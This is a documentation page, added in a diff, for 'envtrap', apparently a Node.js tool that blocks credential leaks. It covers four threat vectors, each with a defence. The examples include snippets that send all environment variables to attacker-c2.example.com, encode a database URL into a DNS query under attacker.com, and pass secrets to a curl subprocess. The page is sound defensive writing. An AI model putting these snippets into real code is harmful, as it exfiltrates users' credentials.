@@ -1,0 +1,77 @@
+---
+title: "Threat Vectors & Supply Chain Attacks"
+description: "Understanding how compromised packages, malicious updates, and diagnostic SDKs exfiltrate credentials."
+---
+
+# Threat Vectors & Threat Modeling
+
+Modern applications depend on vast trees of open-source packages. `envtrap` defends against four primary real-world threat vectors.
+
+---
+
+## 1. Malicious NPM Dependencies
+
+Compromised or typosquatted packages frequently harvest credentials by querying `process.env` during initialization or inside background timers:
+
+```javascript
+// Example malicious snippet embedded in a utility dependency
+const https = require('node:https');
+const secrets = JSON.stringify(process.env);
+
+https.request({
+  hostname: 'attacker-c2.example.com',
+  path: '/harvest',
+  method: 'POST',
+}, (res) => {}).end(secrets);
+```
+
+**How envtrap defends**: The in-memory MITM proxy decrypts and scans the outbound request body. The connection is terminated immediately with a `403 Forbidden` or destroyed socket.
+
+---
+
+## 2. Covert DNS Exfiltration
+
+Attackers aware of outbound HTTP proxies encode sensitive credentials directly into DNS subdomain lookup queries to bypass network firewalls:
+
+```javascript
+// Encoding a secret token into a DNS lookup query
+const dns = require('node:dns');
+const token = process.env.DATABASE_URL; // e.g. postgresql://user:pass@host/db
+
+dns.lookup(`${encodeBase64(token)}.attacker.com`, () => {});
+```
+
+**How envtrap defends**: Virtual `node:dns` hooks inspect requested hostnames for active secret strings and compute Shannon entropy on subdomain labels, blocking the lookup before it reaches external nameservers.
+
+---
+
+## 3. Subprocess Environment Leakage
+
+Utilities or helper scripts often spawn system binaries (`curl`, `wget`, `python`) and pass down `process.env` containing production secrets:
+
+```javascript
+const { exec } = require('node:child_process');
+
+// Leaking production credentials into external utilities
+exec('curl -X POST https://external-service.com/webhook', {
+  env: process.env,
+});
+```
+
+**How envtrap defends**: The `child_process` wrapper inspects `options.env` and aborts the execution with a synchronous `Error` before any process is forked.
+
+---
+
+## 4. Accidental Console & Log Exfiltration
+
+Crash handlers, debuggers, and logging libraries often serialize entire error objects or request contexts to standard output:
+
+```javascript
+try {
+  await executePayment();
+} catch (err) {
+  console.error("Payment failure dump:", { config: process.env });
+}
+```
+
+**How envtrap defends**: `stdout` and `stderr` streams are scanned in real time. Matching secrets are redacted inline with non-reversible SHA-256 fingerprints before terminal display or log ingestion.
